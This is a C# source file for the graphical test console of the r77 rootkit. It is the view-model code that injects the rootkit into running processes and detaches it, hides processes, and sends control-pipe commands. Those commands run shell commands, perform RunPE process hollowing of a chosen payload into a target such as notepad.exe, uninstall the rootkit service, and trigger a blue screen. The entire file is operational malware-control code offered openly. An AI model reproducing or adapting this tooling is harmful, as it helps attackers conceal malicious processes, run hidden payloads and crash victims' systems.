using BytecodeApi;
using BytecodeApi.Extensions;
using BytecodeApi.IO.FileSystem;
using BytecodeApi.IO.Http;
using BytecodeApi.Threading;
using BytecodeApi.UI;
using BytecodeApi.UI.Data;
using BytecodeApi.UI.Dialogs;
using Global;
using System;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Windows;

namespace TestConsole
{
	public sealed class MainWindowViewModel : ObservableObject
	{
		public static MainWindowViewModel Singleton { get; private set; }
		public MainWindow View { get; set; }

		private DelegateCommand _ElevateCommand;
		private DelegateCommand<string> _RunCommand;
		private DelegateCommand<ProcessView> _InjectCommand;
		private DelegateCommand<ProcessView> _DetachCommand;
		private DelegateCommand<ProcessView> _HideCommand;
		private DelegateCommand<ProcessView> _UnhideCommand;
		private DelegateCommand _InjectAllCommand;
		private DelegateCommand _DetachAllCommand;
		private DelegateCommand _ControlCodeRunPEPayloadPathBrowseCommand;
		private DelegateCommand<ControlCode> _ControlCommand;
		private DelegateCommand<string> _HelpCommand;
		public DelegateCommand ElevateCommand => _ElevateCommand ?? (_ElevateCommand = new DelegateCommand(ElevateCommand_Execute, ElevateCommand_CanExecute));
		public DelegateCommand<string> RunCommand => _RunCommand ?? (_RunCommand = new DelegateCommand<string>(RunCommand_Execute));
		public DelegateCommand<ProcessView> InjectCommand => _InjectCommand ?? (_InjectCommand = new DelegateCommand<ProcessView>(InjectCommand_Execute));
		public DelegateCommand<ProcessView> DetachCommand => _DetachCommand ?? (_DetachCommand = new DelegateCommand<ProcessView>(DetachCommand_Execute));
		public DelegateCommand<ProcessView> HideCommand => _HideCommand ?? (_HideCommand = new DelegateCommand<ProcessView>(HideCommand_Execute));
		public DelegateCommand<ProcessView> UnhideCommand => _UnhideCommand ?? (_UnhideCommand = new DelegateCommand<ProcessView>(UnhideCommand_Execute));
		public DelegateCommand InjectAllCommand => _InjectAllCommand ?? (_InjectAllCommand = new DelegateCommand(InjectAllCommand_Execute));
		public DelegateCommand DetachAllCommand => _DetachAllCommand ?? (_DetachAllCommand = new DelegateCommand(DetachAllCommand_Execute));
		public DelegateCommand ControlCodeRunPEPayloadPathBrowseCommand => _ControlCodeRunPEPayloadPathBrowseCommand ?? (_ControlCodeRunPEPayloadPathBrowseCommand = new DelegateCommand(ControlCodeRunPEPayloadPathBrowseCommand_Execute));
		public DelegateCommand<ControlCode> ControlCommand => _ControlCommand ?? (_ControlCommand = new DelegateCommand<ControlCode>(ControlCommand_Execute));
		public DelegateCommand<string> HelpCommand => _HelpCommand ?? (_HelpCommand = new DelegateCommand<string>(HelpCommand_Execute));

		private bool UpdateProcessesNow;
		private bool _IsInitialized;
		private ObservableCollection<ProcessView> _Processes;
		private ProcessView _SelectedProcess;
		private bool _IsAboutVisible;
		private string _ControlCodeInjectProcessId;
		private string _ControlCodeDetachProcessId;
		private string _ControlCodeShellExecPath;
		private string _ControlCodeShellExecCommandLine;
		private string _ControlCodeRunPETargetPath;
		private string _ControlCodeRunPEPayloadPath;
		public bool IsInitialized
		{
			get => _IsInitialized;
			set => Set(ref _IsInitialized, value);
		}
		public ObservableCollection<ProcessView> Processes
		{
			get => _Processes;
			set
			{
				Set(ref _Processes, value);
				RaisePropertyChanged(nameof(IsR77ServiceRunning));
			}
		}
		public ProcessView SelectedProcess
		{
			get => _SelectedProcess;
			set => Set(ref _SelectedProcess, value);
		}
		public bool IsR77ServiceRunning => Processes.Count(process => process.IsR77Service || process.Name == "dllhost.exe" && process.IsHiddenById) >= (Environment.Is64BitOperatingSystem ? 2 : 1);
		public bool IsAboutVisible
		{
			get => _IsAboutVisible;
			set => Set(ref _IsAboutVisible, value);
		}
		public string ControlCodeInjectProcessId
		{
			get => _ControlCodeInjectProcessId;
			set => Set(ref _ControlCodeInjectProcessId, value);
		}
		public string ControlCodeDetachProcessId
		{
			get => _ControlCodeDetachProcessId;
			set => Set(ref _ControlCodeDetachProcessId, value);
		}
		public string ControlCodeShellExecPath
		{
			get => _ControlCodeShellExecPath;
			set => Set(ref _ControlCodeShellExecPath, value);
		}
		public string ControlCodeShellExecCommandLine
		{
			get => _ControlCodeShellExecCommandLine;
			set => Set(ref _ControlCodeShellExecCommandLine, value);
		}
		public string ControlCodeRunPETargetPath
		{
			get => _ControlCodeRunPETargetPath;
			set => Set(ref _ControlCodeRunPETargetPath, value);
		}
		public string ControlCodeRunPEPayloadPath
		{
			get => _ControlCodeRunPEPayloadPath;
			set => Set(ref _ControlCodeRunPEPayloadPath, value);
		}

		public MainWindowViewModel(MainWindow view)
		{
			Singleton = this;
			View = view;

			Processes = new ObservableCollection<ProcessView>();
			ControlCodeRunPETargetPath = @"C:\Windows\System32\notepad.exe";
		}

		public void OnLoaded()
		{
			if (!ApplicationBase.Process.IsElevated)
			{
				Log(new LogMessage
				(
					LogMessageType.Warning,
					new LogTextItem("To inject or detach elevated processes,"),
					new LogLinkItem("run as administrator", () => ElevateCommand.Execute())
				), true);
			}

			if (new[] { "Helper32.exe", "Helper64.exe" }.Any(file => !File.Exists(Path.Combine(ApplicationBase.Path, file))))
			{
				Log(new LogMessage
				(
					LogMessageType.Error,
					new LogTextItem("Files"),
					new LogFileItem("Helper32.exe"),
					new LogTextItem("and"),
					new LogFileItem("Helper64.exe"),
					new LogTextItem("not found.")
				), true);
			}

			BeginUpdateProcesses();
		}

		private bool ElevateCommand_CanExecute()
		{
			return !ApplicationBase.Process.IsElevated;
		}
		private void ElevateCommand_Execute()
		{
			ApplicationBase.RestartElevated(null, () => Application.Current.Shutdown());
		}
		private void RunCommand_Execute(string parameter)
		{
			string fileName;

			switch (parameter)
			{
				case "Example":
					fileName = Config.HidePrefix + "-Example.exe";
					break;
				case "Install":
					fileName = "Install.exe";
					break;
				case "Uninstall":
					fileName = "Uninstall.exe";
					break;
				default:
					throw new ArgumentException();
			}

			string path = Path.Combine(ApplicationBase.Path, fileName);
			if (File.Exists(path))
			{
				try
				{
					Process.Start(fileName);

					Log(new LogMessage
					(
						LogMessageType.Information,
						new LogTextItem("File"),
						new LogFileItem(fileName),
						new LogTextItem("was executed.")
					));
				}
				catch (Exception ex)
				{
					Log(new LogMessage
					(
						LogMessageType.Error,
						new LogTextItem("Executing"),
						new LogFileItem(fileName),
						new LogTextItem("failed."),
						new LogDetailsItem("Error Details: " + ex.Message)
					));
				}
			}
			else
			{
				Log(new LogMessage
				(
					LogMessageType.Error,
					new LogTextItem("File"),
					new LogFileItem(fileName),
					new LogTextItem("not found.")
				));
			}
		}
		private void InjectCommand_Execute(ProcessView parameter)
		{
			Log(ProcessList.Inject(parameter).ToArray());
			UpdateProcesses();
		}
		private void DetachCommand_Execute(ProcessView parameter)
		{
			Log(ProcessList.Detach(parameter).ToArray());
			UpdateProcesses();
		}
		private void HideCommand_Execute(ProcessView parameter)
		{
			Log(ProcessList.Hide(parameter).ToArray());
			UpdateProcesses();
		}
		private void UnhideCommand_Execute(ProcessView parameter)
		{
			Log(ProcessList.Unhide(parameter).ToArray());
			UpdateProcesses();
		}
		private void InjectAllCommand_Execute()
		{
			Log(ProcessList.InjectAll().ToArray());
			UpdateProcesses();
		}
		private void DetachAllCommand_Execute()
		{
			Log(ProcessList.DetachAll().ToArray());
			UpdateProcesses();
		}
		private void ControlCodeRunPEPayloadPathBrowseCommand_Execute()
		{
			if (FileDialogs.Open("exe") is string path)
			{
				ControlCodeRunPEPayloadPath = path;
			}
		}
		private void ControlCommand_Execute(ControlCode parameter)
		{
			try
			{
				switch (parameter)
				{
					case ControlCode.R77TerminateService:
						Log(ControlPipe.Write(parameter).ToArray());
						break;
					case ControlCode.R77Uninstall:
						Log(ControlPipe.Write(parameter).ToArray());
						break;
					case ControlCode.R77PauseInjection:
						Log(ControlPipe.Write(parameter).ToArray());
						break;
					case ControlCode.R77ResumeInjection:
						Log(ControlPipe.Write(parameter).ToArray());
						break;
					case ControlCode.ProcessesInject:
						{
							if (ControlCodeInjectProcessId.IsNullOrWhiteSpace())
							{
								Log(new LogMessage
								(
									LogMessageType.Error,
									new LogFileItem(parameter.GetDescription()),
									new LogTextItem("Specify a process ID.")
								));
							}
							else if (ControlCodeInjectProcessId.ToInt32OrNull() is int processId)
							{
								Log(ControlPipe.Write(parameter, BitConverter.GetBytes(processId), ControlCodeInjectProcessId).ToArray());
							}
							else
							{
								Log(new LogMessage
								(
									LogMessageType.Error,
									new LogFileItem(parameter.GetDescription()),
									new LogTextItem("Invalid process ID:"),
									new LogDetailsItem(ControlCodeInjectProcessId)
								));
							}
						}
						break;
					case ControlCode.ProcessesInjectAll:
						Log(ControlPipe.Write(parameter).ToArray());
						break;
					case ControlCode.ProcessesDetach:
						{
							if (ControlCodeDetachProcessId.IsNullOrWhiteSpace())
							{
								Log(new LogMessage
								(
									LogMessageType.Error,
									new LogFileItem(parameter.GetDescription()),
									new LogTextItem("Specify a process ID.")
								));
							}
							else if (ControlCodeDetachProcessId.ToInt32OrNull() is int processId)
							{
								Log(ControlPipe.Write(parameter, BitConverter.GetBytes(processId), ControlCodeDetachProcessId).ToArray());
							}
							else
							{
								Log(new LogMessage
								(
									LogMessageType.Error,
									new LogFileItem(parameter.GetDescription()),
									new LogTextItem("Invalid process ID:"),
									new LogDetailsItem(ControlCodeDetachProcessId)
								));
							}
						}
						break;
					case ControlCode.ProcessesDetachAll:
						Log(ControlPipe.Write(parameter).ToArray());
						break;
					case ControlCode.UserShellExec:
						ControlCodeShellExecPath = ControlCodeShellExecPath?.Trim().ToNullIfEmpty();
						ControlCodeShellExecCommandLine = ControlCodeShellExecCommandLine?.Trim().ToNullIfEmpty();

						if (ControlCodeShellExecPath == null)
						{
							Log(new LogMessage
							(
								LogMessageType.Error,
								new LogFileItem(parameter.GetDescription()),
								new LogTextItem("Specify a path.")
							));
						}
						else
						{
							using (MemoryStream memoryStream = new MemoryStream())
							{
								using (BinaryWriter writer = new BinaryWriter(memoryStream))
								{
									writer.Write(ControlCodeShellExecPath.ToUnicodeBytes());
									writer.Write((short)0);
									if (ControlCodeShellExecCommandLine != null) writer.Write(ControlCodeShellExecCommandLine.ToUnicodeBytes());
									writer.Write((short)0);
								}

								Log(ControlPipe.Write(parameter, memoryStream.ToArray(), ControlCodeShellExecPath + (ControlCodeShellExecCommandLine == null ? null : " " + ControlCodeShellExecCommandLine)).ToArray());
							}
						}
						break;
					case ControlCode.UserRunPE:
						ControlCodeRunPETargetPath = ControlCodeRunPETargetPath?.Trim().ToNullIfEmpty();
						ControlCodeRunPEPayloadPath = ControlCodeRunPEPayloadPath?.Trim().ToNullIfEmpty();

						if (ControlCodeRunPETargetPath == null)
						{
							Log(new LogMessage
							(
								LogMessageType.Error,
								new LogFileItem(parameter.GetDescription()),
								new LogTextItem("Specify a target path.")
							));
						}
						else if (ControlCodeRunPEPayloadPath == null)
						{
							Log(new LogMessage
							(
								LogMessageType.Error,
								new LogFileItem(parameter.GetDescription()),
								new LogTextItem("Specify a payload.")
							));
						}
						else if (!File.Exists(ControlCodeRunPETargetPath))
						{
							Log(new LogMessage
							(
								LogMessageType.Error,
								new LogTextItem("File"),
								new LogFileItem(Path.GetFileName(ControlCodeRunPETargetPath)),
								new LogTextItem("not found.")
							));
						}
						else if (!File.Exists(ControlCodeRunPEPayloadPath))
						{
							Log(new LogMessage
							(
								LogMessageType.Error,
								new LogTextItem("File"),
								new LogFileItem(Path.GetFileName(ControlCodeRunPEPayloadPath)),
								new LogTextItem("not found.")
							));
						}
						else
						{
							using (MemoryStream memoryStream = new MemoryStream())
							{
								using (BinaryWriter writer = new BinaryWriter(memoryStream))
								{
									writer.Write(ControlCodeRunPETargetPath.ToUnicodeBytes());
									writer.Write((short)0);
									writer.Write((int)new FileInfo(ControlCodeRunPEPayloadPath).Length);
									writer.Write(File.ReadAllBytes(ControlCodeRunPEPayloadPath));
								}

								Log(ControlPipe.Write(parameter, memoryStream.ToArray(), Path.GetFileName(ControlCodeRunPEPayloadPath) + " -> " + Path.GetFileName(ControlCodeRunPETargetPath)).ToArray());
							}
						}
						break;
					case ControlCode.SystemBsod:
						if (MessageBoxes.Confirmation("WARNING: This will trigger a blue screen.\r\nContinue?", true) == true)
						{
							Log(ControlPipe.Write(parameter).ToArray());
						}
						break;
					default:
						throw new ArgumentException();
				}
			}
			catch (Exception ex)
			{
				Log(new LogMessage
				(
					LogMessageType.Error,
					new LogTextItem("Sending command to control pipe failed."),
					new LogDetailsItem("Error Details: " + ex.Message)
				));
			}
		}
		private void HelpCommand_Execute(string parameter)
		{
			switch (parameter)
			{
				case "Documentation":
					try
					{
						byte[] pdf = HttpClient.Default.Get("https://docs.bytecode77.com/r77-rootkit/Technical%20Documentation.pdf").ReadBytes();
						TempDirectory.ExecuteFile("Technical Documentation.pdf", pdf);
					}
					catch (Exception ex)
					{
						Log(new LogMessage
						(
							LogMessageType.Error,
							new LogTextItem("Error downloading"),
							new LogFileItem("Technical Documentation.pdf"),
							new LogTextItem("Please visit"),
							new LogLinkItem("https://bytecode77.com/r77-rootkit", () => Process.Start("https://bytecode77.com/r77-rootkit")),
							new LogDetailsItem("Error Details: " + ex.Message)
						));
					}
					break;
				case "About":
					IsAboutVisible = true;
					break;
				default:
					throw new ArgumentException();
			}
		}

		public void Log(params LogMessage[] messages)
		{
			foreach (LogMessage message in messages) Log(message, false);
		}
		public void Log(LogMessage message, bool silent)
		{
			View.WriteLog(message, silent);
		}
		public void UpdateProcesses()
		{
			UpdateProcessesNow = true;
		}
		private void BeginUpdateProcesses()
		{
			ThreadFactory.StartThread(() =>
			{
				while (true)
				{
					ObservableCollection<ProcessView> newProcesses = ProcessView.GetProcesses().ToObservableCollection();

					// Only update the list, if it has changed.
					bool updated = false;
					if (newProcesses.Count == Processes.Count)
					{
						for (int i = 0; i < newProcesses.Count; i++)
						{
							if (!newProcesses[i].Equals(Processes[i]))
							{
								updated = true;
								break;
							}
						}
					}
					else
					{
						updated = true;
					}

					if (updated)
					{
						ProcessView newSelectedProcess = newProcesses.FirstOrDefault(process => process.Id == SelectedProcess?.Id);
						int scrollOffset = SelectedProcess != null && newSelectedProcess != null ? newProcesses.IndexOf(newSelectedProcess) - Processes.IndexOf(SelectedProcess) : -1;

						View.Dispatch(() =>
						{
							int oldScrollOffset = View.ProcessListScrollOffset;

							SelectedProcess = null;
							Processes = newProcesses;
							SelectedProcess = newSelectedProcess;

							if (scrollOffset != -1) View.ProcessListScrollOffset = oldScrollOffset + scrollOffset;
						});
					}

					CSharp.Timeout(() => UpdateProcessesNow, TimeSpan.FromSeconds(1), TimeSpan.FromMilliseconds(10));
					UpdateProcessesNow = false;
				}
			});
		}
	}
}